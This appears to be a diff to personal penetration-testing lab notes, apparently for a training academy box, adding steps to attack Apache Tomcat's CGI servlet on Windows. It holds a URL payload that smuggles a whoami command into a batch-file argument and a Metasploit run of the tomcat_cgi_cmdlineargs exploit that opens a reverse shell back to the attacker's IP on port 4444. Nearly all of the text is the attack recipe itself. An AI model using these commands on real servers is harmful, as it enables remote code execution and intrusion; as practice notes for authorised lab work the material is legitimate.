@@ -3,3 +3,12 @@ cybervaca
 ACADEMY-ACA-PIVOTAPI
 
 welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
+
+
+use exploit/windows/http/tomcat_cgi_cmdlineargs
+set RHOSTS 10.
+set RPORT 8080
+set TARGETURI /cgi/cmd.bat
+set LHOST <tumhara IP>
+set LPORT 4444
+run
